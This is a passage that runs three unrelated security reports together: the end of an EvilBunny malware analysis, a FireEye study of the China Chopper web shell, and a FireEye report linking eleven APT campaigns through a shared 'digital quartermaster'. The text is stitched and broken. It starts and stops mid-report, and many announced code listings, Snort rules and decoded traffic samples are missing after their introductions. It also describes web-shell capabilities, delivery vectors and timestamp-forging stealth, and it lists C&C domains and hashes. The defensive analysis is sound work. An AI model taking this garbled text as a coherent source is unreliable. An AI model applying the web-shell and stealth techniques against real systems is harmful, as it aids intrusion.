Throughout analysis and due to the help of Paul Rascagniéres a number of binaries which relate to EvilBunny were identified : 2a64d331964dbdec8141f16585f392ba 40E0F0681C79D70AC0329E68A94294CB 8132ee00f64856cf10930fd72505cebe e8a333a726481a72b267ec6109939b0d 3bbb59afdf9bda4ffdc644d9d51c53e7 c40e3ee23cf95d992b7cd0b7c01b8599 330dc1a7f3930a2234e505ba11da0eea 83b7c532663f11bf994a1b518880557d b8ac16701c3c15b103e61b5a317692bc bbf4b1961ff0ce19db748616754da76e The binaries share parts of source code , most notably is the identical API name obfuscation algorithm and respective key AB34CD77h .
The indicators of a relation among all samples or a subset of samples are the following : • Same API name obfuscation algorithm and key • Equal infection routines / source code • Equal AntiVirus product enumeration technique • Shared C & C domain names and equal C & C commands • Equal proxy bypass technique / source code Mentioned set of malware also shows parallels in coding style and structure .
However , it has to be pointed out that suspect # 4 without doubt sticks out in terms of complexity and functionality .
It is assumed that suspect # 4 was created by the same authors , but this can not be proved .
Four of the set of identified samples are identical in functionality and capability .
They possess respectable flooding capabilities and also provide remote access .
However , they do not support data stealing or any spying functionality .
Two more C & C domains were identified for this group : http : //callientefever.info / img / new / n.php http : //fullapple.net / pictures / bkp / n.php Regarding the nature of the attack or the actor behind EvilBunny only vague conclusions can be drawn .
There has been public contemplation that the actor might be french and that the malware might be related to samples analyzed by the Canadian CSEC .
However , there has n't been any hard evidence which links the attack to a group or a geographical location .
Attribution is a tricky task and assumptions must not be drawn easily .
For providing technical insights , support and if I remember right even water , coffee or occationally rum , I want to express my deepest gratitude to Morgan Marquis - Boire , Sebastien Larinier , Paul Rascagniéres , Nicolas Brulez , Michael Shalyt and Inbar Raz .
Further I want to thank Fred Arbogast , Alexandre Dulaunoy , Raphael Vinot and the remaining organizing team of Hack.lu for their advice and effort , even in situations of widespread insomnia .
All of you – such wow , very awesome ; rock on ! [ 1 ] An Analysis Of CVE-2011 - 4369 http : //blog.9bplus.com / analyzing - cve-2011 - 4369-part - one/ [ 2 ] ThreatExpert Report on c40e3ee23cf95d992b7cd0b7c01b8599 http : //www.threatexpert.com / report.aspx ? md5=c40e3ee23cf95d992b7cd0b7c01b8599 [ 3 ] How to disable UAC https : //social.technet.microsoft.com / Forums / windowsserver / en - US/0aeac9d8 - 3591 - 4294- b13e-825705b27730/how - to - disable - uac [ 4 ] The Lua Project http : //www.lua.org/ [ 5 ] The C / Invoke Project http : //www.nongnu.org / cinvoke/ [ 6 ] Lua scriptable game engines ( Wikipedia ) http : //en.wikipedia.org / wiki / Category : Lua - scriptable_game_engines [ 7 ] All file hashes related to the EvilBunny malware http : //pastebin.com/7iedeFF5 [ 8 ] Hack.lu 2014 Keynote on TS / NOFORN http : //www.slideshare.net / pinkflawd / tsnoforn [ 9 ] Quand les Canadiens partent en chasse de « Babar » http : //www.lemonde.fr / international / article/2014/03/21/quand - les - canadiens - partent - en- chasse - de - babar_4387233_3210.html Marked in Grey is the data of sinkholes for the mentioned domains , currently operated by Kaspersky .
China Chopper is an increasingly popular Web shell that packs a powerful punch into a small package .
In the space of just 4 kilobytes , the Web shell offers file and database management , code obfuscation , and more - all in an easy - to - use graphical user interface that even novices can use .
Given its growing prevalence , especially among Chinese cybercriminals , China Chopper warrants much more exposure than it has received to date .
Outside of an insightful blog post from security researcher Keith Tyler , little useful information on China Chopper is publically available .
To contribute something new to the public knowledge base - especially for those who happen to find the China Chopper server - side payload on one of their Web servers - FireEye studied the components , capabilities , payload attributes , and the detection rate of this 4 kilobyte menace .
This report describes the features that make China Chopper an increasingly popular tool for cyber attackers .
And more important , the report explains how security professionals can better detect the Web shell through network traffic and on compromised systems .
China Chopper is a simple backdoor in terms of components .
It has two key components : the Web shell command - and - control ( CnC ) client binary and a text - based Web shell payload ( server component ) .
The text - based payload is so simple and short that an attacker could type it by hand right on the target server - no file transfer needed .
The Web shell client was originally available on www.maicaidao.com .
FireEye advises against visiting that site now .
The client binary is packed with UPX and is 220,672 bytes in size , as shown in Figure 1 .
The executable file compressor UPX unpacks the binary to reveal details hidden by the packer .
C : \Documents and Settings\Administrator\Desktop > upx -d 5001ef50c7e869253a7c152a638eab8a.exe -o decomp.exe Ultimate Packer for eXecutables Copyright ( C ) 1996 - 2011 UPX 3.08w Markus Oberhumer , Laszlo Molnar & John Reiser Dec 12th 2011 File size Ratio Format Name -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- - -- -- -- -- -- - 700416 < - 220672 31.51 % win32/pe decomp.exe Unpacked 1 file .
PEiD ( a free tool for detecting packers , cryptors , and compilers found in PE executable files ) , reveals that the unpacked client binary was written in Microsoft Visual C++ 6.0 , as shown in Figure 2 .
Because the strings are not encoded , examining them in the unpacked binary exposes how the backdoor communicates .
Appearing in the strings are an intriguing reference to google.com.hk using the Chinese ( simplified ) language parameter ( Figure 3 ) and references to the text `` Chopper '' ( Figure 4 ) .
In action , China Chopper is a menu - driven GUI full of convenient attack and `` target - management '' features .
When opened , the client displays example shell entries that point to www.maicaidao.com , which originally hosted components of the Web shell .
To add a target , attackers right click within the client window , select Add from the menu and enter the target IP address , password , and encoding as shown in Figure 5 .
But the client is only half of the remote access tool ( RAT ) -and not likely the part that would appear on a targeted network .
Its communication relies on a payload in the form of a small Web application .
This payload is available in a variety of languages such as ASP , ASPX , PHP , JSP , and CFM .
Table 2 shows some of the original files available for download shown with their MD5 hashes .
Even though the MD5s are useful , this is a text - based payload that can be easily changed , resulting in a new MD5 hash .
Here is an example of just one of China Chopper 's text - based payloads ( for more details , see `` Payload Attributes '' on Page 11 ) : In real - world use , `` password '' would be replaced with the actual password to be used in the client component when connecting to the Web shell .
The capabilities of both the payload and the client are impressive considering their size .
The Web shell client contains a `` Security Scan '' feature , independent of the payload , that gives the attacker the ability to spider and use brute - force password guessing against authentication portals .
In addition to vulnerability hunting , China Chopper has excellent CnC features when combining the client and payload , include the following : • File Management ( File explorer ) • Database Management ( DB client ) • Virtual Terminal ( Command shell ) In China Chopper 's main window , right - clicking one of the target URLs brings up a list of possible actions ( see Figure 7 ) .
Used as a RAT , China Chopper makes file management simple .
Abilities include uploading and downloading files to and from the target , using the file - retrieval tool Wget to download files from the Web to the target .
Attackers can also edit , delete , copy , and rename files - and even change their time stamp .
The Modify the file time option is a surprisingly effective stealth technique .
Figure 9 shows the time stamps of the three files in the test directory before the Web shell modifies the time stamps .
By default , Windows Explorer shows only the `` Date Modified '' field .
Without the time stamp change , the Web shell easily stands out because it is newer than the other two files .
Figure 10 shows the date of the file after the Web shell modifies the time stamp .
The `` Date Modified '' value on the Web shell shows up as the same as the other two files .
This is the default field displayed to users , so to the untrained eye it easily blends in - especially with many files in the directory .
Clever investigators may think that they can spot the suspicious file due to the creation date being changed to the same date as the modified date .
But this is not necessarily anomalous .
Additionally , even if the file is detected , the forensic timeline is skewed because the date that the attacker planted the file is no longer present .
Finding the real date that the file was planted requires examining the Master File Table ( MFT ) .
After acquiring the MFT using FTK , EnCase , or other means , FireEye recommends using mftdump .
Written by FireEye researcher Mike Spohn , mftdump is a great tool for extracting and analyzing file metadata .
Table 3 shows the time stamps pulled from the MFT for our Web shell file before and after the time stamps were modified .
The `` fn * '' fields retain their original times , so some useful information remains .
The database management functionality is impressive and helpful to the first - time user .
Upon configuring the client , China Chopper provides example connection syntax .
After connecting , China Chopper also provides useful SQL commands .
Finally , China Chopper provides command shell access for OS - level interaction , further demonstrating its versatility .
China Chopper is stealthy due to a number of factors , including the following : • Size • Server - side content • Client - side content • AV detection rate ( or lack thereof ) Malicious and benign software usually suffers from the same principle : more features equals more code , which equals larger size .
Considering how many features China Chopper offers , it is incredibly small - just 73 bytes for the ASPX version , or 4 kilobytes on disk ( see Figure 14 ) .
Compare that to other Web shells such as Laudanum ( 619 bytes ) or RedTeam Pentesting ( 8,527 bytes ) .
China Chopper is so small and simple that an attacker could conceivably type the contents of the shell by hand .
The server - side content could easily be overlooked among the other files associated with a vanilla install of a complex application .
The code does not look malicious - just odd .
Below are the contents of the Web shell for two of its varieties .
Because all of the code is server - side language that does not generate client - side code , browsing to the Web shell and viewing the source as a client reveals nothing .
Running the Web shell through the virus - scanning website `` No Virus Thanks '' shows a detection rate of 0 out of 14 , indicating that most , if not all , anti - virus tools would miss the Web shell on an infected system .
The same holds true for VirusTotal .
None of its 47 anti - virus engines flags China Chopper as malicious .
China Chopper can run on any Web server capable of running JSP , ASP , ASPX , PHP , or CFM - the majority of Web application languages .
China Chopper can also run transparently on both Windows and Linux .
This OS and application flexibility make China Chopper an even more dangerous Web shell .
`` Server - side Payload Component '' on Page 5 showed China Chopper executing on a Windows 2003 IIS server using ASPX .
Figure 19 shows it running on Linux with PHP .
Here , the contents of the PHP version are just as minimalistic .
While the available options differ depending on what platform China Chopper is running on , the file management features in Linux ( see Figure 20 ) are similar to those in Windows .
The database client example shown in Figure 21 is MySQL instead of MS - SQL , but it offers many of the same capabilities .
The virtual terminal looks familiar ( Figure 22 ) , but uses Linux commands instead of Windows because they are ultimately interpreted by the underlying operating system .
China Chopper 's delivery mechanism is flexible due to the size , format , and simplicity of the malware 's payload .
This small , text - based payload can be delivered using any of the following mechanisms : • WebDAV file upload • JBoss jmx - console or Apache Tomcat management pages ( For more details on this attack vector , read FireEye consultant Tony Lee 's explanation ) • Remote exploit with a file drop • Lateral propagation from other access After examining the server - side payload and the client used to control the Web shell , the next step to understanding China Chopper is observing its traffic .
Having both the server and client components enables researchers to start a packet capture to view the contents of typical traffic .
As shown in Figure 23 , the client initiates the connection over TCP port 80 using the HTTP POST method .
Because this is TCP traffic , researchers can `` follow the TCP '' stream in Wireshark , a popular open - source network - protocol analyzer that works in Unix and Windows .
In Figure 24 , the traffic in red at the top is from the attacker ( Web client ) .
The traffic shown in blue at the bottom is the response from the target ( Web shell ) .
As highlighted above , the majority of the attacker traffic appears to be Base64 encoded .
This is not a problem though , because it can be easily decoded .
Using the `` TextWizard '' feature of the free Fiddler Web debugger reveals what the attacker is sending .
( Note : % 3D is a URL - encoded representation of the equal sign ( `` = '' ) .
Fiddler needs this to be converted to an equal sign for proper decoding .
) Raw attacker traffic : As shown In Figure 25 , the Fiddler Web debugger text wizard easily converts the raw traffic from Base64 to plain text .
Decoded traffic : The decoded traffic presents something more readable .
But the Base64-decoded traffic shows an attempt to decode more Base64 traffic stored as `` z1 '' and `` z2 .
'' The attacker traffic shows z1 and z2 parameters immediately after the end of the `` Password '' parameter .
The Base64-encoded parameters z1 and z2 are highlighted in the following output : Base64-decoded parameters z1 and z2 : This code explains how the client communicates with the shell .
The `` Password '' parameter passes the code to the payload to be executed .
The z1 is cmd , and z2 contains the arguments to the command prompt sent via cmd /c .
All output is sent to standard output ( stdout ) back to the attacker , which creates the following response to the whoami command and the present working directory : Understanding the contents of China Chopper and what its traffic looks like allows researchers to detect this pest both at the network and the host level .
With a standard Snort IDS in place , this traffic can be caught with relative ease .
Keith Tyler provides the following basic IDS signature in his previously cited China Chopper blog post : To reduce false positives , tighten the Snort IDS signature to focus on China Chopper by looking for contents of `` FromBase64String '' and `` z1 '' as follows : The following IDS signature looks for content of `` FromBase64String '' and any combination of `` z '' followed by one to three digits - it would find `` z1 '' , `` z10 '' , or `` z100 '' for example .
The idea : if the first command ( z1 ) is missed , the signature still catches subsequent commands .
Both of these IDS signatures can be optimized further to factor depth and offset .
Be sure to put a validSID in before implementing and test the signature for performance .
Because the shells must contain a predictable syntax , researchers can quickly attempt to find files that have that code in play .
Many methods can be used to find files that contain China Chopper .
The quickest and easiest method , especially on a Linux machine , is probably using regular expressions .
As shown in Figure 26 , a quick egrep across the Web directory can help identify infected files .
As shown in Figure 26 , the egrep and regex commands are a powerful combination .
While the regex syntax may seem like gibberish , mastering it is not as difficult as it seems at first glance .
Ian Ahl has created a few tutorials that can help improve researchers ' regex skills .
Here are two to get started : • Regex basics ( http : //www.tekdefense.com / news/2012/10/21/tektip - ep12-regex - basics.html ) • Using regex with Notepad ( http : //www.tekdefense.com / news/2013/1/6/tektip - ep19-using - regex - with - notepad.html ) Windows also provides a way to search files using regular expressions with its native findstr command .
The command string differs from the regex equivalent .
This was necessary to get around some of the ways that findstr interprets regex .
The findstr command runs as follows : These examples show detection in the PHP shell .
To find the ASPX shell , modify the regex to fit the syntax of the ASPX shell as shown : Researchers unsure where all of the PHP or ASPX files are on a Windows host can use the dir command with some extended options to help identify Web files to run the regex command against ( see Figure 28 ) .
Findstr also has an option to search all subdirectories ( see Figure 29 ) , as follows : Armed with knowledge about China Chopper 's features , platform versatility , delivery mechanisms , traffic analysis , and detection - along with a few free software tools - researchers can begin eradicating this elegantly designed but dangerous menace .
To learn more about how FireEye can help your organization find China Chopper and other advanced malware , visit www.fireeye.com .
Many seemingly unrelated cyber attacks may , in fact , be part of a broader offensive fueled by a shared development and logistics infrastructure - a finding that suggests some targets are facing a more organized menace than they realize .
This report examines 11 advanced persistent threat ( APT ) campaigns targeting a wide swath of industries .
Though they appeared unrelated at first , further investigation uncovered several key links between them : the same malware tools , the same elements of code , binaries with the same timestamps , and signed binaries with the same digital certificates .
Taken together , these commonalities point to centralized APT planning and development .
How prevalent this model has become is unclear .
But adopting it makes financial sense for attackers , so the findings may imply a bigger trend .
This report focuses on two key findings : • Shared development and logistics • A shared malware - builder tool Examining the 11 APT campaigns revealed a shared development and logistics operation used to support several APT actors in distinct but overlapping campaigns .
This development and logistics operation is best described as a `` digital quartermaster .
'' Its mission : supply and maintain malware tools and weapons to support cyber espionage .
This digital quartermaster also might be a cyber arms dealer of sorts , a common supplier of tools used to conduct attacks and establish footholds in targeted systems .
SFireEye researchers located a builder tool likely used in some of the 11 APT campaigns .
The tools appear to be written in Chinese , and the testing infrastructure appears to all be configured with the native Chinese language character set , and the dialogues and menu options in the builder tool are in Chinese .
In May 2013 , FireEye first reported on the `` Sunshop '' campaign , which compromised several strategic websites and redirected visitors to a site serving multiple exploits .
In August 2013 , FireEye reported that the campaign was continuing and , later that month , discovered additional related attacks .
Examining the underlying infrastructure of these attacks revealed that the campaign utilized resources shared across other APT campaigns not initially tied to Sunshop .
The other campaigns included multiyear onslaughts targeting companies across 15 industries .
Given the wide range of targets observed , the campaigns ' specific objectives ( beyond the obvious intellectual property theft ) are unclear .
This report outlines the following : • The quantity and categories of malicious binaries related to the originally identified Sunshop attacks and 10 other campaigns subsequently linked to Sunshop • The underlying infrastructure , including components of code used across these campaigns • Clusters of APT activity previously believed to be unrelated • A malware builder that likely supported one of these APT activity clusters The 11 interconnected campaigns targeted these industries : • Aerospace / Defense / Airlines • Applied research and development • Chemicals / Manufacturing / Mining • Higher education • Entertainment / Media / Hospitality • Energy / Utilities / Petroleum refining • Financial services • Federal government • State and local government • Healthcare / Pharmaceuticals • High - tech • Insurance • Legal services • Services / Consulting / VAR • Telecommunications FireEye detected activity from the campaigns between July 2011 and September 2013 , but they were likely active before then .
Though the campaigns utilized varying techniques , tactics , and procedures ( TTPs ) , they all leveraged a common development infrastructure .
They shared ( in various combinations ) the following : • Portable executable resources • Digital certificates • API import tables • Compile times • Command - and - control ( CnC ) infrastructure Based on the evidence , this report outlines the following possible conclusions : • [ High Confidence ] A `` Sunshop Digital Quartermaster '' ( SDQ ) exists and supports separate APT campaigns .
FireEye believes that the most likely explanation for these links is a shared development and logistics operation that supports several APT campaigns as part of formal offensive apparatus .
• [ Low Confidence ] SDQ and APT campaigns are a single actor .
Another conceivable possibility is tha the 11 clusters of activity , previously believed to be independent campaigns run by different actors , are in fact one cluster of activity run by one well - resourced actor .
However , we believe this scenario is less likely because each cluster of activity utilized malware samples with different artifacts such as passwords , campaign identifiers , and mutexes .
These artifacts were generally consistent within each cluster of activity but differed across clusters .
• [ Medium Confidence ] SDQ does not exist , and APT actors informally share among each other .
Alternatively , different actors may be responsible for the documented 11 clusters of activity .
Instead of relying on a centralized development and logistics operation , they share TTPs through formal or informal channels .
On May 20 , 2013 FireEye first reported on the Sunshop campaign .
The actor responsible for this campaign compromised a number of strategic websites , redirecting visitors to a site serving multiple exploits .
Almost three months later , FireEye reported that the campaign was continuing .
We discovered additional related attacks about a week after that .
During the intervening time , we examined the underlying infrastructure supporting these attacks and found that the Sunshop campaign utilized resources shared across a number of other APT campaigns not initially tied to Sunshop .
What we initially believed to be 11 different APT campaigns used the same malware tools , the same elements of code , binaries with the same timestamps , and signed binaries with the same digital certificates .
Through this discovery , we believe that we have identified a shared development and logistics operation used to support a number of different APT actors engaged in distinctive but overlapping campaigns .
This development and logistics operation is best described as a digital quartermaster whose mission is to supply and maintain malware tools and weapons used in support of cyber espionage operations .
This digital quartermaster is a possible cyber arms dealer , supplying the operators responsible for conducting attacks and establishing footholds within targeted organizations .
As such , we refer to this entity as the Sunshop Digital Quartermaster ( SDQ ) .
To support this conclusion , we first present an overview of our research , including the total number and type of malicious binaries we found to be related to Sunshop and the 10 other linked campaigns .
We then describe the underlying infrastructure , including the components of code used across these campaigns .
We further describe the different clusters of APT activity that we previously believed to be unrelated .
Finally , we describe one of the malware builders we believe was used to support one of these clusters of APT activity .
We collected 110 unique binaries , which were detected as Trojan . APT.9002 , Trojan . APT.PoisonIvy , Trojan . APT.Gh0st , Trojan . APT.Kaba , and Trojan . APT.Briba .
Sixty - five of these binaries were packaged with two unique manifest resources , and 47 were signed with six different digital certificates .
The binaries connected to 54 unique fully qualified domains .
We identified these samples by searching binaries packaged with the two unique portable executable ( PE ) resources that we had previously identified .
We believe that these PE resources are unique to Sunshop and the 10 other linked campaigns .
We also searched for samples signed with the six different digital certificates that were used to sign binaries connected to these campaigns .
These certificates were not unique to these campaigns and have been used to sign unrelated malware .
Therefore , we cross - checked samples signed with any of these certificates to ensure that they were , in fact , related to the 10 campaigns we identified as linked to Sunshop .
As we identified related campaigns that leveraged the unique PE resources or digital certificates , we then pivoted off the CnC infrastructure to identify additional samples .
We cross - checked samples identified through this process to ensure that they did indeed share the code elements that we previously identified as unique to Sunshop and its associated campaigns .
We searched our internal repositories , including the FireEye high performance cluster and other wellknown external repositories .
We primarily relied on running active searches with YARA signatures designed to identify samples , with either the PE resources or digital certificates .
We also compared the import tables used in each sample to establish additional links between the 10 different campaigns linked to Sunshop .
All of this research led us to the above - mentioned 110 binaries .
Figure 2 plots the samples in a Maltego chart .
Figure 2 shows only domains , IP addresses , and MD5 malware / dropper hashes collected during our research .
These limited data points display 11 different and seemingly independent clusters of activity .
We continued our analysis by adding the following additional data points to our graph .
• Two portable executable ( PE ) resources used by 64 samples in our collection • Six different digital certificates used by 47 samples in our collections • Hashes of the different import tables used by the binaries in our graph These additional data points linked the 11 different clusters of activity and revealed what we believe to be a shared development logistics infrastructure .
Figure 3 illustrates the overlaps and connections that exist between what initially appeared to be 11 independent campaigns .
This chart shows how the additional data points of the shared PE resources , commonly used digital certificates , and identical import tables can link these different campaigns together .
Our research analyzed the following to identify and tie all 11 campaigns to the SDQ : • PE resources • Import tables • Authenticode / Digital certificates • Compile times We found that 64 of the 110 samples analyzed during this analysis were packaged with two almost identical portable executable resources .
In both cases , the resources appeared to be manifests generated by the Nullsoft scriptable installation system ( NSIS ) .
Nullsoft is a script - driven tool that simplifies the installation routines of executable files onto the Microsoft Windows operating system .
We identify the first of these manifest resources as the `` Sunshop manifest .
'' It has these properties : The full text of the PE resource manifest is shown in Figure 4 .
We found 44 unique binaries packaged with the above Sunshop manifest .
These samples were detected as Trojan . APT.9002 , Trojan . APT.Gh0st , and Trojan . APT.PoisonIvy .
We observed these 44 samples used in eight of the 11 different campaigns discussed below .
We identify the second manifest resource as the `` DTL manifest .
'' This resource has these properties : The full text of the PE resource manifest is as follows : We found 20 samples using the DTL manifest .
These binaries were detected as Trojan . APT.9002 .
We observed these 20 samples used in five of the 11 different campaigns discussed below .
The only difference between these manifest resources is the indentation of the < security > elements .
Lines 10 through 13 in Figure 6 detail this difference .
This slight difference results in a different hash for the resource .
The similarity between these two manifests would likely go unnoticed by automated analysis .
Also , the XML is improperly formatted , hinting that it was formatted manually .
As an experiment , we used NSIS v2.34 to create our own simple installer and found that the XML in the manifest had no new - line or tab characters .
We utilized a simple technique to identify similarities in import tables between the 110 different samples we analyzed during our analysis .
We aggregated the import calls found in each sample and used this as a unique fingerprint .
We then used these fingerprints to cluster similar samples together .
The Python code in Figure 6 relies on the module pefile and can be used to dump all the import calls used in a specific binary .
The output can then be easily hashed .
We found 33 unique import tables used for the 110 different samples we collected during our research .
The most common import table seen had a MD5 hash of 3a7faeac22e6ab5c3c28a2b617901b51 and appeared in 38 different binaries .
This particular import table appeared in both Trojan . APT.9002 and Trojan .
APT.PoisonIvy binaries .
It was used in eight of the 11 different clusters of activity we studied during this analysis .
In addition to the identical import tables , these samples have the same code base , differing in the unpacking routine for the actual payload , indicating that they are general - purpose launchers .
Upon execution , the malware samples with the import table hash of 3a7faeac22e6ab5c3c28a2b617901b51 called back to these domains and IP addresses : • ieee.boeing-job [ .
] com • lol.dns-lookup [ .
] us • twn.ftpmicrosoft [ .
] com • 127.0.0.1 • piping.no-ip [ .
] org • wv.downmicrisoft [ .
] com • mx.downmicrisoft [ .
] com • update1.mysq1 [ .
] net • ru.pad62 [ .
] com • phpweb.zapto [ .
] org • asp.homesvr.linkpc [ .
] net • dns.homesvr [ .
] tk • ssl.homesvr [ .
] tk The second most common import table had a MD5 hash of f6d9eda2b4ab23b1f2be49e1a4f9a1f7 and appeared in 12 different samples .
These 12 samples were all detected as Trojan . APT.PoisonIvy and appeared in only one of the 10 campaigns discussed below .
Upon execution , all of the malware samples with this import table hash beaconed to these domains : • luckmegame.servegame [ .
] com • luckmevnc.myvnc [ .
] com The third most common import table had a MD5 hash of 71213bd677edc82c6ef30cb505c13dec and appeared in nine different samples .
These samples were all detected as Trojan . APT.9002 and appeared in three of the 10 campaigns we analyzed .
Upon execution , these samples called back to these domains : • engage.intelfox [ .
] com • ru.pad62 [ .
] com • tank.hja63 [ .
] com • dtl.eatuo [ .
] com • dtl6.mooo [ .
] com • dtl.dnsd [ .
] me Digital certificates are used to validate the authenticity of code .
Attackers often use stolen or spoofed digital certificates to sign their malicious code and improve the likelihood that their code will execute successfully on its target .
During our research , we found six digital certificates used to sign 44 different malware samples .
These certificates are currently revoked or expired and were signed by Microsoft , Sinacom , Facesun.cn , Mgame Corp , Guangzhou YuanLuo Technology Co. , Ltd. , and Wuhan Tian Chen Information Technology Co. , Ltd .
The full details of these certificates are available in Appendix A .
According to Kaspersky , the Mgame Corp. and Guangzhou YuanLuo Technology Co. , Ltd. certificates were stolen .
Whether the remaining certificates were also stolen - or were ever valid - is unclear .
The certificates from Mgame Corp and Wuhan Tian Chen Information Technology Co. , Ltd. were used most frequently .
We found 24 samples signed with the certificate from Mgame Corp .
These samples were all detected as Trojan . APT.9002 and appeared in four of the 10 campaigns we studied during this research .
We found 15 samples signed with the certificate from Wuhan Tian Chen Information Technology Co. , Ltd .
These samples were all detected as Trojan . APT.PoisonIvy and appeared in one of the 10 campaigns discussed below .
Although the compilation time of binaries can be easily forged , analyzing them is still useful .
The timestamp may not reveal when a binary was actually compiled , but it can be used to cluster samples by identical compile times .
The most common compile time was December 19 , 2012 at 20:25 .
We found 28 binaries compiled at this time .
All of these binaries were detected as Trojan . APT.9002 and utilized the Sunshop PE resource .
We observed samples with this timestamp in six of the 11 clusters of APT activity we studied during this research .
The next most common compile time was July 21 , 2012 at 14:50 .
We identified five samples compiled at this time .
All of these samples were detected as Trojan . APT.9002 and utilized the DTL PE resource .
These samples appeared in two of the 11 campaigns .
The use of this same compile times across a number of different campaigns is another indication that a common development and logistics infrastructure supported these disparate operations .
The shared characteristics were used across malware tools used in at least 11 different clusters of APT activity .
These clusters were originally believed to be separate and distinct campaigns and were grouped together based on shared CnC infrastructure using passive DNS data or registration information .
The Sunshop campaign appears to primarily leverage strategic Web compromise as a vector of attack .
We have detailed the specifics of the Sunshop campaign on the FireEye blog .
We found 15 different samples linked to the Sunshop campaign .
These samples were detected as Trojan . APT.Gh0st , Trojan .
APT.PoisonIvy , Trojan . APT.Briba , and Trojan . APT.9002 .
All of the Sunshop samples that we identified had compile times between January 1 , 2013 and August 24 , 2013 .
Twelve of the 15 utilized the Sunshop PE resource , and none was signed with any of the six identified digital certificates .
When executed , the Sunshop samples beaconed to these CnC servers : • appupdate.myvnc [ .
] com • asp.homesvr.linkpc [ .
] net • dns.homesvr [ .
] tk • 9ijhh45.zapto [ .
] org • newtibet [ .
] tk • ssl.homesvr [ .
] tk • nameserver1.zapto [ .
] org • phpweb.zapto [ .
] org • homeweb.sytes [ .
] net • intelupdate.hopto [ .
] org • ajaxcode.zapto [ .
] org • updateinfor.hopto [ .
] org • mynews.sytes [ .
] net • The campaign targeted these industries : • State and local government • Telecommunications • Legal services Table 2 outlines Sunshop - related malware and compile times .
The DTL campaign appears to depend primarily on spear - phishing email as an initial infection vector .
We found seven different samples linked to the DTL campaign .
All of these samples were detected as Trojan . APT.9002 .
These samples were compiled between September 19 , 2012 and July 30 , 2013 .
All of these samples were packaged with the DTL PE resource , and one of the samples was signed with the digital certificate from Mgame Corp .
When executed , the DTL samples called back to these CnC servers : • dtl.eatuo [ .
] com • dtl.dnsd [ .
] me • dtl6.mooo [ .
] com • img.advertisingsee [ .
] com The campaign targeted these industries : • Federal government • State and local government • Services / Consulting / VAR • Financial services • Telecommunications • Aerospace / Defense / Airlines • Energy / Utilities / Petroleum refining • Healthcare / Pharmaceuticals • Entertainment / Media / Hospitality • Insurance • Chemicals / Manufacturing / Mining • High - tech • Higher education The Ru.pad62 campaign appears to utilize both spear - phishing email and strategic Web compromise as initial infection vectors .
We found 26 different samples linked to the Ru.pad62 campaign .
These samples were detected as Trojan . APT.9002 , Trojan . APT.Gh0st , Trojan . APT.Kaba , and Trojan . APT.PoisonIvy .
The 26 linked samples had compile timestamps between September 19 , 2011 and December 19 , 2012 .
Ten of the samples from the Ru.pad62 campaign were packaged with the DTL resource , and six of the samples were packaged with the Sunshop resource .
Only four samples linked to the Ru.pad62 campaign were signed with digital certificates - two with the Mgame Corp. certificate and two with a certificate from Microsoft .
When executed , the Ru.pad62 samples we found called back to these CnC servers : • ru.pad62 [ .
] com • tank.hja63 [ .
] com • 173.234.184 [ .
] 45 • fly.pad62 [ .
] com • tho.pad62 [ .
] com • tho.hja63 [ .
] com The campaign targeted these industries : • Higher education • Entertainment / Media / Hospitality • High - tech The Downmicrisoft campaign appears to utilize strategic Web compromise as an initial infection vector .
We found five different samples linked to the Downmicrisoft campaign .
These samples were detected as Trojan . APT.9002 and Trojan . APT.Gh0st .
The five samples had compile timestamps between December 19 , 2012 and April 4 , 2013 .
The earliest compile time for samples from the Downmicrisoft campaign ( December 19 , 2012 ) was the same day as the latest compile time for samples from the Ru . Pad62 campaign .
Three of the samples linked to the Downmicrisoft campaign were packaged with the Sunshop PE resource , and all but one sample was signed with the Mgame Corp. digital certificate .
When executed , the Downmicrisoft samples called back to these CnC servers : • wv.downmicrisoft [ .
] com • mx.downmicrisoft [ .
] com • up.downmicrisoft [ .
] com • tebit-newtwn.ftpmicrosoft [ .
] com • twn.ftpmicrosoft [ .
] com The campaign targeted these industries : • Entertainment / Media / Hospitality • High - tech The same media organization targeted in the Downmicrisoft campaign was also targeted in the Ru . Pad62 campaign .
Also , the Trojan . APT.Gh0st sample linked to the Downmicrisoft campaign , c27730971c04cdf049b44912a50b4804 , did not use the default `` Gh0st '' string .
Instead , this sample used the string `` HTTPS '' .
Gh0st variants with this same string were described by RSA in a 2012 paper .
The Boeing - Job campaign appears to utilize strategic Web compromises as an initial infection vector .
We previously discussed the Boeing - Job campaign 's use of the `` Lady Boyle '' Flash exploit on the FireEye blog .
We identified 19 different samples linked to the Boeing - Job campaign .
These samples were all detected as Trojan . APT.9002 and had compile timestamps between July 21 , 2012 and April 3 , 2013 .
Seven of the samples from the Boeing - Job campaign were packaged with both the Sunshop PE resource , and all but two were signed with the Mgame Corp. digital certificate .
When executed , the Boeing - Job samples called back to these CnC servers : • www.boeing-job [ .
] com • engage.intelfox [ .
] com • ieee.boeing-job [ .
] com • lol.dns-lookup [ .
] us • 127.0.0.1 The campaign targeted these industries : • Financial services • Energy / Utilities / Petroleum refining • Telecommunications The Google - blogspot campaign appears to utilize strategic Web compromise as an initial infection vector .
We identified seven different samples linked to the Google - blogspot campaign .
These samples were all detected as Trojan . APT.Gh0st or Trojan . APT.PoisonIvy .
The Google - blogspot samples had compile timestamps between September 16 , 2008 and June 27 , 2012 .
Four of the samples from the Google - blogspot campaign were packaged with the Sunshop PE resource , and one sample was signed with a digital certificate from Facesun.cn .
When executed , the Google - blogspot samples called back to these CnC servers : • soft.google-blogspot [ .
] com • www.google-blogspot [ .
] com • blog.googleblog.iego [ .
] net The campaign targeted this industry : • Healthcare / Pharmaceuticals The Luckme campaign appears to utilize strategic Web compromise as an initial infection vector .
We identified 18 different samples linked to the Luckme campaign .
These samples were all detected as Trojan .
APT.PoisonIvy and had compile timestamps between April 3 , 2011 and April 3 , 2013 .
Four of the samples from the Luckme campaign were packaged with the Sunshop PE resource .
Fifteen of the Luckme samples were signed with the digital certificate from Wuhan Tian Chen Information Technology Co. , Ltd .
When executed , Luckme samples called back to these CnC servers : • luckmegame.servegame [ .
] com • luckmevnc.myvnc [ .
] com • huangma.dyndns [ .
] org • zhouweb.dyndns [ .
] info • frontpage.dyndns [ .
] org • frontpage.dhis [ .
] org • blankorder.zapto [ .
] org • blankorder.dyndns-mail [ .
] com • registrat.dyndns [ .
] org • registrat.zapto [ .
] org The campaign targeted these industries : • High - tech • Aerospace / Defense / Airlines • Federal government • Services / Consulting / VAR The Piping campaign appears to utilize strategic Web compromise as an initial infection vector .
We identified four different samples linked to the Piping campaign .
These samples were detected as Trojan . APT.PoisonIvy and Trojan . APT.9002 .
